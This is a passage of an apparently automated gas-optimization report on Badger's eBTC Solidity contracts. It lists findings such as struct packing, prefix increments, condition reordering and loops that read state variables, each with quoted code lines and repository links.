<summary>
There are 4 instances of this issue:

</summary>

###
#
Optimization opportunity in struct 
```
File: contracts/BorrowerOperations.sol

97    struct MoveTokensParams {
98            address user;
99            uint256 collSharesChange;
100            uint256 collAddUnderlying; // ONLY for isCollIncrease=true
101            bool isCollIncrease;
102            uint256 netDebtChange;
103            bool isDebtIncrease;
104        }
```

- original variable order (count: 6 slots)
    - address user
    - uint256 collSharesChange
    - uint256 collAddUnderlying
    - bool isCollIncrease
    - uint256 netDebtChange
    - bool isDebtIncrease


 - optimized variable order (count: 4 slots)
    - address user
    - bool isCollIncrease
    - bool isDebtIncrease
    - uint256 collSharesChange
    - uint256 collAddUnderlying
    - uint256 netDebtChange


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L97-L104](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L97-L104)


#
Optimization opportunity in struct 
```
File: contracts/Interfaces/IPriceFeed.sol

17    struct ChainlinkResponse {
18            uint80 roundEthBtcId;
19            uint80 roundStEthEthId;
20            uint256 answer;
21            uint256 timestampEthBtc;
22            uint256 timestampStEthEth;
23            bool success;
24        }
```

- original variable order (count: 5 slots)
    - uint80 roundEthBtcId
    - uint80 roundStEthEthId
    - uint256 answer
    - uint256 timestampEthBtc
    - uint256 timestampStEthEth
    - bool success


 - optimized variable order (count: 4 slots)
    - uint80 roundEthBtcId
    - uint80 roundStEthEthId
    - bool success
    - uint256 answer
    - uint256 timestampEthBtc
    - uint256 timestampStEthEth


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPriceFeed.sol#L17-L24](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPriceFeed.sol#L17-L24)


#
Optimization opportunity in struct 
```
File: contracts/LeverageMacroBase.sol

259    struct LeverageMacroOperation {
260            address tokenToTransferIn;
261            uint256 amountToTransferIn;
262            SwapOperation[] swapsBefore; // Empty to skip
263            SwapOperation[] swapsAfter; // Empty to skip
264            OperationType operationType; // Open, Close, etc..
265            bytes OperationData; // Generic Operation Data, which we'll decode to use
266        }
```

- original variable order (count: 6 slots)
    - address tokenToTransferIn
    - uint256 amountToTransferIn
    - LeverageMacroBase.SwapOperation[] swapsBefore
    - LeverageMacroBase.SwapOperation[] swapsAfter
    - LeverageMacroBase.OperationType operationType
    - bytes OperationData


 - optimized variable order (count: 5 slots)
    - address tokenToTransferIn
    - LeverageMacroBase.OperationType operationType
    - uint256 amountToTransferIn
    - LeverageMacroBase.SwapOperation[] swapsBefore
    - LeverageMacroBase.SwapOperation[] swapsAfter
    - bytes OperationData


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L259-L266](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L259-L266)


#
Optimization opportunity in struct 
```
File: contracts/SimplifiedDiamondLike.sol

99    struct Operation {
100            address to; // Target to call
101            bool checkSuccess; // If false we will ignore a revert
102            uint128 value; // How much ETH to send
103            uint128 gas; // How much gas to send
104            bool capGas; // true to use above "gas" setting or we send gasleft()
105            OperationType opType; // See `OperationType`
106            bytes data; // Calldata to send (funsig + data)
107        }
```

- original variable order (count: 4 slots)
    - address to
    - bool checkSuccess
    - uint128 value
    - uint128 gas
    - bool capGas
    - SimplifiedDiamondLike.OperationType opType
    - bytes data


 - optimized variable order (count: 3 slots)
    - address to
    - bool checkSuccess
    - bool capGas
    - SimplifiedDiamondLike.OperationType opType
    - uint128 value
    - uint128 gas
    - bytes data


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L99-L107](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L99-L107)


</details>

# 


## [G-29] Postfix operations that could be replaced with prefix operations
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 60

### Description
Postfix operations should be replaced with prefix operations to save gas, 
    in case the result returned by the operation is ignored.

<details>

<summary>
There are 12 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManager.sol

429    _maxIterations--
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L429](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L429)


#

```
File: contracts/Governor.sol

46    i++
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L46](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L46)


#

```
File: contracts/Governor.sol

62    j++
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L62](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L62)


#

```
File: contracts/Governor.sol

57    i++
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L57](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L57)


#

```
File: contracts/Governor.sol

87    j++
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L87](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L87)


#

```
File: contracts/Governor.sol

84    i++
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L84](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L84)


#

```
File: contracts/Governor.sol

76    i++
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L76](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L76)


#

```
File: contracts/Governor.sol

98    i++
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L98](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L98)


#

```
File: contracts/Governor.sol

111    j++
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L111](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L111)


#

```
File: contracts/Governor.sol

107    i++
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L107](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L107)


#

```
File: contracts/Governor.sol

122    i++
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L122](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L122)


#

```
File: contracts/HintHelpers.sol

195    i++
```
 should use a prefix operation

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L195](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L195)


</details>

# 


## [G-30] Redundant Bool Comparison
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 9

### Description
This detector checks for instances where a boolean expression is compared to a boolean literal (true or false), which is redundant.

<details>

<summary>
There are 1 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManager.sol

332    require(redemptionsPaused == false, "CdpManager: Redemptions Paused")
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L332](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L332)


</details>

# 


## [G-31] Redundant state variable getters
- Severity: Gas Optimization
- Confidence: High

### Description
Detects and reports state variables that have manually coded getters. Getters for public state variables are automatically generated in Solidity. Coding them manually is redundant and a waste of gas.

<details>

<summary>
There are 2 instances of this issue:

</summary>

###
#

```
File: contracts/SortedCdps.sol

130    function nonExistId() public pure override returns (bytes32) 
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L130-L132](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L130-L132)


#

```
File: contracts/SortedCdps.sol

548    function getMaxSize() external view override returns (uint256) 
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L548-L550](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L548-L550)


</details>

# 


## [G-32] Consider activating via-ir for deploying
- Severity: Gas Optimization
- Confidence: Medium

### Description
The IR-based code generator was developed to make code generation more transparent and auditable, while also enabling powerful optimization passes that can be applied across functions. 

It is possible to activate the IR-based code generator through the command line by using the flag `--via-ir` or by including the option {'viaIR': true}. 

Keep in mind that compiling with this option may take longer. However, you can simply test it before deploying your code. If you find that it provides better performance, you can add the `--via-ir` flag to your deploy command.

# 


## [G-33] Short-circuit rules can be used to optimize some gas usage
- Severity: Gas Optimization
- Confidence: Medium
- Total Gas Saved: 14700

### Description
Some conditions may be reordered to save an SLOAD (2100 gas), as we avoid reading state variables when the first part of the condition fails (with &&), or succeeds (with ||). For instance, consider a scenario where you have a `stateVariable` (a variable stored in contract storage) and a `localVariable` (a variable in memory). 

If you have a condition like `stateVariable > 0 && localVariable > 0`, if `localVariable > 0` is false, the Solidity runtime will still execute `stateVariable > 0`, which costs an SLOAD operation (2100 gas). However, if you reorder the condition to `localVariable > 0 && stateVariable > 0`, the `stateVariable > 0` check won't happen if `localVariable > 0` is false, saving you the SLOAD gas cost.

Similarly, for the `||` operator, if you have a condition like `stateVariable > 0 || localVariable > 0`, and `stateVariable > 0` is true, the Solidity runtime will still execute `localVariable > 0`. But if you reorder the condition to `localVariable > 0 || stateVariable > 0`, and `localVariable > 0` is true, the `stateVariable > 0` check won't happen, again saving you the SLOAD gas cost.

This detector checks for such conditions in the contract and reports if any condition could be optimized by taking advantage of the short-circuiting behavior of `&&` and `||`.

<details>

<summary>
There are 7 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManager.sol

762    require(
763                _maxFeePercentage >= redemptionFeeFloor && _maxFeePercentage <= DECIMAL_PRECISION,
764                "Max fee percentage must be between redemption fee floor and 100%"
765            )
```


```
 // @audit: Switch _maxFeePercentage <= DECIMAL_PRECISION && _maxFeePercentage >= redemptionFeeFloor 
```
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L762-L765](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L762-L765)


#

```
File: contracts/SortedCdps.sol

601    return data.head == _nextId && _NICR >= cdpManager.getCachedNominalICR(_nextId)
```


```
 // @audit: Switch _NICR >= cdpManager.getCachedNominalICR(_nextId) && data.head == _nextId 
```
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L601](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L601)


#

```
File: contracts/SortedCdps.sol

644    data.tail == _startId && _NICR <= cdpManager.getCachedNominalICR(_startId)
```


```
 // @audit: Switch _NICR <= cdpManager.getCachedNominalICR(_startId) && data.tail == _startId 
```
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L644](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L644)


#

```
File: contracts/SortedCdps.sol

604    return data.tail == _prevId && _NICR <= cdpManager.getCachedNominalICR(_prevId)
```


```
 // @audit: Switch _NICR <= cdpManager.getCachedNominalICR(_prevId) && data.tail == _prevId 
```
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L604](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L604)


#

```
File: contracts/SortedCdps.sol

607    return
608                    data.nodes[_prevId].nextId == _nextId &&
609                    cdpManager.getCachedNominalICR(_prevId) >= _NICR &&
610                    _NICR >= cdpManager.getCachedNominalICR(_nextId)
```


```
 // @audit: Switch cdpManager.getCachedNominalICR(_prevId) >= _NICR && data.nodes[_prevId].nextId == _nextId 
```
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L607-L610](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L607-L610)


#

```
File: contracts/SortedCdps.sol

607    return
608                    data.nodes[_prevId].nextId == _nextId &&
609                    cdpManager.getCachedNominalICR(_prevId) >= _NICR &&
610                    _NICR >= cdpManager.getCachedNominalICR(_nextId)
```


```
 // @audit: Switch _NICR >= cdpManager.getCachedNominalICR(_nextId) && data.nodes[_prevId].nextId == _nextId && cdpManager.getCachedNominalICR(_prevId) >= _NICR 
```
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L607-L610](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L607-L610)


#

```
File: contracts/SortedCdps.sol

621    data.head == _startId && _NICR >= cdpManager.getCachedNominalICR(_startId)
```


```
 // @audit: Switch _NICR >= cdpManager.getCachedNominalICR(_startId) && data.head == _startId 
```
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L621](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L621)


</details>

# 


## [G-34] Use Small Integer For Efficiency
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 30

### Description
This detector flags contracts that inefficiently use `uint` or `int` of sizes smaller than 32 bytes. The EVM operates on 32 bytes at a time, thus using elements smaller than this may cause your contract's gas usage to be higher. Refer to the Solidity documentation for more details: https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html.

<details>

<summary>
There are 5 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManagerStorage.sol

21    uint128 public constant UNSET_TIMESTAMP = type(uint128).max
```
 `UNSET_TIMESTAMP` use 256 bites instead of 128

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L21](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L21)


#

```
File: contracts/CdpManagerStorage.sol

22    uint128 public constant MINIMUM_GRACE_PERIOD = 15 minutes
```
 `MINIMUM_GRACE_PERIOD` use 256 bites instead of 128

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L22](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L22)


#

```
File: contracts/CdpManagerStorage.sol

24    uint128 public lastGracePeriodStartTimestamp = UNSET_TIMESTAMP
```
 `lastGracePeriodStartTimestamp` use 256 bites instead of 128

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L24](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L24)


#

```
File: contracts/CdpManagerStorage.sol

25    uint128 public recoveryModeGracePeriodDuration = MINIMUM_GRACE_PERIOD
```
 `recoveryModeGracePeriodDuration` use 256 bites instead of 128

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L25](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L25)


#

```
File: contracts/EBTCToken.sol

31    uint8 internal constant _DECIMALS = 18
```
 `_DECIMALS` use 256 bites instead of 8

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L31](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L31)


</details>

# 


## [G-35] Splitting Require Assert Statements
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 24

### Description
Instead of using operator && in a a single require clause split into multiple clauses to save gas.

<details>

<summary>
There are 8 instances of this issue:

</summary>

###
#

```
File: contracts/BorrowerOperations.sol

734    require(
735                recoveredAddress != address(0) && recoveredAddress == _borrower,
736                "BorrowerOperations: Invalid signature"
737            )
```
 split the condition:
	-

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L734-L737](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L734-L737)


#

```
File: contracts/CdpManager.sol

762    require(
763                _maxFeePercentage >= redemptionFeeFloor && _maxFeePercentage <= DECIMAL_PRECISION,
764                "Max fee percentage must be between redemption fee floor and 100%"
765            )
```
 split the condition:
	-

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L762-L765](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L762-L765)


#

```
File: contracts/CdpManagerStorage.sol

261    require(
262                closedStatus != Status.nonExistent && closedStatus != Status.active,
263                "CdpManagerStorage: close non-exist or non-active CDP!"
264            )
```
 split the condition:
	-

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L261-L264](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L261-L264)


#

```
File: contracts/CdpManagerStorage.sol

466    require(
467                cdpStatus != Status.nonExistent && cdpStatus != Status.active,
468                "CdpManagerStorage: remove non-exist or non-active CDP!"
469            )
```
 split the condition:
	-

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L466-L469](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L466-L469)


#

```
File: contracts/CdpManagerStorage.sol

653    require(
654                CdpOwnersArrayLength > 1 && sortedCdps.getSize() > 1,
655                "CdpManager: Only one cdp in the system"
656            )
```
 split the condition:
	-

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L653-L656](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L653-L656)


#

```
File: contracts/EBTCToken.sol

296    require(
297                _recipient != address(0) && _recipient != address(this),
298                "EBTC: Cannot transfer tokens directly to the EBTC token contract or the zero address"
299            )
```
 split the condition:
	-

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L296-L299](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L296-L299)


#

```
File: contracts/EBTCToken.sol

300    require(
301                _recipient != cdpManagerAddress && _recipient != borrowerOperationsAddress,
302                "EBTC: Cannot transfer tokens directly to the CdpManager or BorrowerOps"
303            )
```
 split the condition:
	-

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L300-L303](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L300-L303)


#

```
File: contracts/PriceFeed.sol

79    require(
80                !_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse) &&
81                    !_chainlinkIsFrozen(chainlinkResponse),
82                "PriceFeed: Chainlink must be working and current"
83            )
```
 split the condition:
	-

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L79-L83](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L79-L83)


</details>

# 


## [G-36] State variable access within a loop
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 8745

### Description
State variable reads and writes are more expensive than local variable reads and writes. Therefore, it is recommended to replace state variable reads and writes within loops with a local variable. Gas savings should be multiplied by the average loop length.

<details>

<summary>
There are 33 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManager.sol

369    currentBorrower != address(0) && getSyncedICR(_cId, totals.price) < MCR
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L369](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L369)


#

```
File: contracts/CdpManager.sol

370    _cId = sortedCdps.getPrev(_cId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L370](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L370)


#

```
File: contracts/CdpManager.sol

371    currentBorrower = sortedCdps.getOwnerAddress(_cId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L371](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L371)


#

```
File: contracts/CdpManager.sol

424    bytes32 _nextId = sortedCdps.getPrev(_cId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L424](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L424)


#

```
File: contracts/CdpManager.sol

425    address nextUserToCheck = sortedCdps.getOwnerAddress(_nextId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L425](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L425)


#

```
File: contracts/CdpManager.sol

500    _id = sortedCdps.getNext(_id)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L500](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L500)


#

```
File: contracts/Governor.sol

46    i < users.length()
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L46](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L46)


#

```
File: contracts/Governor.sol

47    address user = users.at(i)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L47](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L47)


#

```
File: contracts/HintHelpers.sol

69    vars.currentCdpUser != address(0) &&
70                    cdpManager.getSyncedICR(vars.currentCdpId, _price) < MCR
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L69-L70](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L69-L70)


#

```
File: contracts/HintHelpers.sol

72    vars.currentCdpId = sortedCdps.getPrev(vars.currentCdpId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L72](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L72)


#

```
File: contracts/HintHelpers.sol

73    vars.currentCdpUser = sortedCdps.getOwnerAddress(vars.currentCdpId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L73](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L73)


#

```
File: contracts/HintHelpers.sol

90    uint256 currentCdpDebt = cdpManager.getSyncedCdpDebt(vars.currentCdpId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L90](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L90)


#

```
File: contracts/HintHelpers.sol

102    collateral.getPooledEthByShares(partialRedemptionNewColl) <
103                            MIN_NET_STETH_BALANCE
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L102-L103](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L102-L103)


#

```
File: contracts/HintHelpers.sol

116    vars.currentCdpId = sortedCdps.getPrev(vars.currentCdpId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L116](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L116)


#

```
File: contracts/HintHelpers.sol

117    vars.currentCdpUser = sortedCdps.getOwnerAddress(vars.currentCdpId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L117](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L117)


#

```
File: contracts/HintHelpers.sol

185    bytes32 _cId = cdpManager.getIdFromCdpIdsArray(arrayIndex)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L185](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L185)


#

```
File: contracts/HintHelpers.sol

186    uint256 currentNICR = cdpManager.getSyncedNominalICR(_cId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L186](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L186)


#

```
File: contracts/LiquidationLibrary.sol

756    vars.cdpId != bytes32(0) && Cdps[vars.cdpId].status == Status.active
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L756](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L756)


#

```
File: contracts/LiquidationLibrary.sol

788    vars.backToNormalMode = _TCR < CCR ? false : true
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L788](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L788)


#

```
File: contracts/LiquidationLibrary.sol

819    vars.cdpId != bytes32(0) && Cdps[vars.cdpId].status == Status.active
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L819](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L819)


#

```
File: contracts/SortedCdps.sol

185    _currentCdpId != dummyId
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L185](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L185)


#

```
File: contracts/SortedCdps.sol

199    _currentCdpId = data.nodes[_currentCdpId].prevId
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L199](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L199)


#

```
File: contracts/SortedCdps.sol

248    _currentCdpId != dummyId
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L248](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L248)


#

```
File: contracts/SortedCdps.sol

256    _currentCdpId = data.nodes[_currentCdpId].prevId
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L256](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L256)


#

```
File: contracts/SortedCdps.sol

318    _currentCdpId != dummyId
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L318](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L318)


#

```
File: contracts/SortedCdps.sol

327    _currentCdpId = data.nodes[_currentCdpId].prevId
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L327](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L327)


#

```
File: contracts/SortedCdps.sol

450    delete data.nodes[_ids[i]]
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L450](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L450)


#

```
File: contracts/SortedCdps.sol

629    prevId != dummyId && !_validInsertPosition(_NICR, prevId, nextId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L629](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L629)


#

```
File: contracts/SortedCdps.sol

630    prevId = data.nodes[prevId].nextId
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L630](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L630)


#

```
File: contracts/SortedCdps.sol

631    nextId = data.nodes[prevId].nextId
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L631](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L631)


#

```
File: contracts/SortedCdps.sol

652    nextId != dummyId && !_validInsertPosition(_NICR, prevId, nextId)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L652](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L652)


#

```
File: contracts/SortedCdps.sol

653    nextId = data.nodes[nextId].prevId
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L653](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L653)


#

```
File: contracts/SortedCdps.sol

654    prevId = data.nodes[nextId].prevId
```

